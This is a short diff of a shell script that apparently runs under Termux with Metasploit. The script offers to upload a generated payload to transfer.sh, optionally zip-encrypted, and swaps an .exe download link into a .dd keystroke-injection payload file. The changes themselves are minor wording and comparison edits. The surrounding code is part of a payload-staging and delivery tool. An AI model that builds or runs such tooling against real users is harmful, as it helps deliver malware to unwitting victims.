@@ -29,7 +29,7 @@ DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"
 DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
 
 
-echo "\033[1;33m\n:::: CLEAR DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD, "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(BETA openssl)\033[0m\033[1;33m, or press ENTER for none of that\n\033[0m"
+echo "\033[1;33m\n:::: CLEAR DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD, "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(BETA zip encryption)\033[0m\033[1;33m, or press ENTER for none of that\n\033[0m"
 read UPLOAD_choice
 if [ $UPLOAD_choice = "yy" ]; then
 	zip -e $ENCRYPTEDFILE $TEMP/$FILE
@@ -63,8 +63,7 @@ echo "$(cat $DDFILE | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > $TEMP/old_link.t
 echo "$(cat $LINKFILE)" > $TEMP/new_link.txt
 OLDLINK=$(cat ~/msf/temp/old_link.txt)
 NEWLINK=$(cat ~/msf/temp/new_link.txt)
-if [ "$OLDLINK" == "$NEWLINK" ]
-then
+if [ $OLDLINK = $NEWLINK ]; then
 	echo "\033[1;31m Failed to change the link in the .dd file \033[0m"
 else
 	echo "\033[1;32m\n:::: SUCCESS, PAYLOAD.DD CREATED AND STORED here :"
